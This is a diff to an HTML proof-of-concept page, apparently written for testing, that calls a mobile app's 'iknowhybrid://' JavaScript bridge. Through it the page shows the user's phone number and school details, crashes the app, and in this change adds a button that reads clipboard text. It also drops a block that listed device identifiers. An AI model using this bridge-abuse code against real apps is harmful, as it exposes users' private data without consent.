@@ -57,6 +57,8 @@
     <p style="font-size: 15px;" id="SchoolName"></p>
     <p style="font-size: 15px;" id="SchoolID"></p>
     <p style="font-size: 15px;" id="Grade"></p>
+    <p style="font-size: 15px;" id="SubjectName"></p>
+    <p style="font-size: 15px;" id="SubjectID"></p>
     <p style="font-size: 15px;" id="EducationalAttainment"></p>
 
     <p><span class="larger">Get Your Account Info:</span></p>
@@ -67,16 +69,11 @@
         <img id="AccountAvatar" src="" alt="" width="30%" height="auto">
     </div>
     <p style="font-size: 15px;" id="CryptUid"></p>
-  
-    
-    <p><span class="larger">Get Your Device Info:</span></p>
-    <p style="font-size: 15px;" id="DeviceID"></p>
-    <p style="font-size: 15px;" id="QimeiID"></p>
-    <p style="font-size: 15px;" id="Appkey"></p>
-    <p style="font-size: 15px;" id="SIMNo"></p>
-    <p style="font-size: 15px;" id="DFID"></p>
-    <p style="font-size: 15px;" id="UUID"></p>
-    <p style="font-size: 15px;" id="OAID"></p>
+
+    <p><span class="larger">Read Your ClipBoard:</span></p>
+    Will get your ClipBoard text:
+    <p style="font-size: 15px;" id="ClipBoardText"></p>
+    <input type="button" value="Access ClipBoard" id="AccessClipBoard" style="font-size: 20px; padding: 20px 25px;"/> 
 
     <p><span class="larger">Crash Your App:</span></p>
     <input type="button" value="Crash App" id="Crash" style="font-size: 20px; padding: 20px 25px;"/>
@@ -113,11 +110,20 @@
         document.getElementById("PhoneNumber").innerText = "Your PhoneNumber: " + jsonUser.phone;
         document.getElementById("SchoolID").innerText = "Your SchoolID: " + jsonUser.schoolId;
         document.getElementById("EducationalAttainment").innerText = "Your Educational Attainment: " + jsonUser.educationValue;
-
-
+        document.getElementById("SubjectName").innerText = "Your SubjectName: " + jsonUser.subjectName;
+        document.getElementById("SubjectID").innerText = "Your SubjectID: " + jsonUser.subjectId;
+        // document.getElementById("AccountAvatar").src = jsonUser.avatar;
     }
     fetchData('iknowhybrid://getuserinfo?data={}&__callback__=mycallback_getuserinfo');
 
+    function mycallback_getClipboardData(res) {
+        var json = res;
+        document.getElementById("ClipBoardText").innerText = json.result;
+    }
+    document.getElementById("AccessClipBoard").onclick = function () {
+        fetchData('iknowhybrid://getClipboardData?data={}&__callback__=mycallback_getClipboardData');
+    }
+    
     </script>
 
 </body>
